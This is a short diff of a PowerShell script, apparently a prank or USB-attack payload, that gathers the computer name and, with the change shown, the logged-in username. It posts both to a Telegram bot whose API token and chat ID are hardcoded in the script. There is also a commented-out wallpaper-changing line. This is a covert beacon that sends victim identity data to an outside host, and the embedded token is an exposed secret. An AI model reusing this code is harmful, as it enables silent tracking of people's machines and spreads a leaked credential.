@@ -1,10 +1,11 @@
 #3
 
 $ComputerName = $env:COMPUTERNAME
+$UserName = $env:USERNAME
 $token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
 $chatId = "5757392163"
 
-$msg = "A executar script em $ComputerName"
+$msg = "A executar script em $ComputerName - $UserName"
     Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
         -Method Post `
         -ContentType "application/json" `
@@ -88,6 +89,7 @@ public class Params
 #Set-WallPaper -Image "$env:TMP\i.png" -Style Center
 
 exit
+
 
 
 
